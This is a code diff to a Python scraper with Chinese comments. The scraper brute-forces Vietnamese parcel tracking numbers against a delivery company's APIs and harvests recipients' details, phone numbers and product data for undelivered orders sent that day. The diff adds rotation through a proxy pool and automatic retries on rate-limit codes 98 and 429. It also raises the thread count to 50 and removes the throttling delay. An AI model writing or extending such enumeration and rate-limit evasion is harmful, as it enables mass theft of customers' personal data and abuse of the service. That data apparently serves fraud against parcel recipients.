@@ -148,13 +148,64 @@ def extract_phone(text):
     phones = re.findall(r'0\d{8,10}', str(text))
     return phones[0] if phones else None
 
+def call_api_with_retry(url, headers, data=None, json_data=None, max_retries=10):
+    """调用API并支持限流重试（自动切换代理）"""
+    for attempt in range(max_retries):
+        try:
+            # 随机选择代理
+            proxy = random.choice(proxies) if proxies else None
+            
+            # 发送请求
+            if json_data:
+                r = requests.post(url, headers=headers, json=json_data, proxies=proxy, timeout=8)
+            else:
+                r = requests.post(url, headers=headers, data=data, proxies=proxy, timeout=8)
+            
+            # 检查响应
+            if r.status_code == 200:
+                try:
+                    data = r.json()
+                    code = data.get('Code', '')
+                    
+                    # 检测限流（Code: 98 或 429）
+                    if code == '98' or code == '429':
+                        # 限流，换代理重试
+                        time.sleep(0.2 + random.uniform(0, 0.3))  # 随机延迟
+                        continue
+                    
+                    # 正常返回（Code: 00 或 01 都算成功）
+                    return r, data
+                except:
+                    # JSON解析失败，但HTTP成功
+                    return r, None
+            else:
+                # HTTP错误，换代理重试
+                if attempt < max_retries - 1:
+                    time.sleep(0.1)
+                    continue
+                return r, None
+                
+        except requests.exceptions.Timeout:
+            # 超时，换代理重试
+            if attempt < max_retries - 1:
+                continue
+            return None, None
+        except Exception as e:
+            # 其他错误，换代理重试
+            if attempt < max_retries - 1:
+                time.sleep(0.1)
+                continue
+            return None, None
+    
+    # 所有重试都失败
+    return None, None
+
 def check_order_full(tracking):
-    """完整版查询：同时调用3个API获取所有字段"""
+    """完整版查询：同时调用3个API获取所有字段（支持限流重试）"""
     if state['found'] >= TARGET:
         return None
     
     sig = sign(tracking)
-    proxy = random.choice(proxies) if proxies else None
     
     # 准备请求头
     headers_form = {
@@ -226,84 +277,65 @@ def check_order_full(tracking):
         with state['lock']:
             state['tested'] += 1
         
-        # ==================== API 1: Inquiry ====================
-        try:
-            r1 = requests.post(
-                f"{API_URL}api/Delivery/Inquiry",
-                headers=headers_form,
-                data={"ParcelCode": tracking, "Signature": sig},
-                proxies=proxy,
-                timeout=8
-            )
+        # ==================== API 1: Inquiry（支持限流重试）====================
+        r1, data1 = call_api_with_retry(
+            f"{API_URL}api/Delivery/Inquiry",
+            headers_form,
+            data={"ParcelCode": tracking, "Signature": sig},
+            max_retries=10
+        )
+        
+        if r1 and data1 and data1.get('Code') == '00' and data1.get('Value'):
+            v = data1['Value']
             
-            if r1.status_code == 200:
-                data1 = r1.json()
-                if data1.get('Code') == '00' and data1.get('Value'):
-                    v = data1['Value']
-                    
-                    # 保存所有Inquiry字段
-                    for key in v.keys():
-                        if key in order:
-                            order[key] = v[key] if v[key] is not None else ''
-                    
-                    # 检查日期：只要今天的或日期为空的，排除今天之外的
-                    issue_date = v.get('IssueDate') or v.get('LoadDate')
-                    # 如果日期存在且不是今天，则跳过
-                    if issue_date and not is_today(issue_date):
-                        return None  # 不是今天的，跳过
-                    # 如果日期为空或是今天，则继续处理
-                else:
-                    return None  # 查询失败，跳过
+            # 保存所有Inquiry字段
+            for key in v.keys():
+                if key in order:
+                    order[key] = v[key] if v[key] is not None else ''
+            
+            # 检查日期：只要今天的或日期为空的，排除今天之外的
+            issue_date = v.get('IssueDate') or v.get('LoadDate')
+            # 如果日期存在且不是今天，则跳过
+            if issue_date and not is_today(issue_date):
+                return None  # 不是今天的，跳过
+            # 如果日期为空或是今天，则继续处理
+        else:
+            return None  # 查询失败，跳过
+        
+        # ==================== API 2: DeliveryLadingJourney（支持限流重试）====================
+        r2, data2 = call_api_with_retry(
+            f"{API_URL}api/Delivery/DeliveryLadingJourney",
+            headers_form,
+            data={"ParcelCode": tracking},
+            max_retries=10
+        )
+        
+        if r2 and data2:
+            if data2.get('Code') == '00' and data2.get('ListValue'):
+                journey_list = data2['ListValue']
+                order['journey_records'] = journey_list
+                order['journey_count'] = len(journey_list)
+                order['is_delivered'] = True
             else:
-                return None
-        except Exception as e:
-            return None
+                order['is_delivered'] = False
         
-        # ==================== API 2: DeliveryLadingJourney ====================
-        try:
-            r2 = requests.post(
-                f"{API_URL}api/Delivery/DeliveryLadingJourney",
-                headers=headers_form,
-                data={"ParcelCode": tracking},
-                proxies=proxy,
-                timeout=8
-            )
-            
-            if r2.status_code == 200:
-                data2 = r2.json()
-                if data2.get('Code') == '00' and data2.get('ListValue'):
-                    journey_list = data2['ListValue']
-                    order['journey_records'] = journey_list
-                    order['journey_count'] = len(journey_list)
-                    order['is_delivered'] = True
-                else:
-                    order['is_delivered'] = False
-        except:
-            pass
+        # ==================== API 3: Gateway/Bussiness（支持限流重试）====================
+        r3, data3 = call_api_with_retry(
+            f"{API_URL}api/Gateway/Bussiness",
+            headers_json,
+            json_data={"Code": "LDP002", "Data": tracking},
+            max_retries=10
+        )
         
-        # ==================== API 3: Gateway/Bussiness ====================
-        try:
-            r3 = requests.post(
-                f"{API_URL}api/Gateway/Bussiness",
-                headers=headers_json,
-                json={"Code": "LDP002", "Data": tracking},
-                proxies=proxy,
-                timeout=8
-            )
-            
-            if r3.status_code == 200:
-                data3 = r3.json()
-                if data3.get('Code') == '00' and data3.get('Data'):
-                    try:
-                        products = json.loads(data3['Data'])
-                        order['products'] = products
-                        order['product_count'] = len(products)
-                        if products:
-                            order['product_name'] = products[0].get('ProductName', '')
-                    except:
-                        pass
-        except:
-            pass
+        if r3 and data3 and data3.get('Code') == '00' and data3.get('Data'):
+            try:
+                products = json.loads(data3['Data'])
+                order['products'] = products
+                order['product_count'] = len(products)
+                if products:
+                    order['product_name'] = products[0].get('ProductName', '')
+            except:
+                pass
         
         # 只保存未配送的订单
         if not order['is_delivered']:
@@ -440,7 +472,13 @@ print(f"""
   • API 1 (Inquiry): 38个基础字段
   • API 2 (Journey): 配送轨迹
   • API 3 (Gateway): 商品信息
-  • 只保存今天发件 + 未签收的订单
+  • 只保存今天发件 + 未签收的订单（日期为空也保留）
+
+⚡ 性能优化：
+  • 50 线程高速并发（提升速度）
+  • 100 个代理池轮询
+  • 遇到限流自动切换代理重试（最多10次）
+  • 自动处理 Code 98/429 限流
 
 📊 输出格式：
   • CSV: 包含所有42个字段（适合Excel分析）
@@ -457,10 +495,10 @@ print(f"""
 
 load_proxies()
 
-print(f"🚀 开始高速扫描（完整版）...\n")
+print(f"🚀 开始高速扫描（完整版 - 支持限流自动重试）...\n")
 start_time = time.time()
 
-with ThreadPoolExecutor(max_workers=30) as executor:
+with ThreadPoolExecutor(max_workers=50) as executor:  # 提升并发数到50
     futures = []
     
     for prefix, start, end, step in SCAN_RANGES:
@@ -473,10 +511,6 @@ with ThreadPoolExecutor(max_workers=30) as executor:
             
             tracking = f"{prefix}{num:09d}VN"
             futures.append(executor.submit(check_order_full, tracking))
-            
-            # 每1000个显示进度
-            if len(futures) % 1000 == 0:
-                time.sleep(0.1)  # 避免太快
     
     # 等待完成
     for future in as_completed(futures):
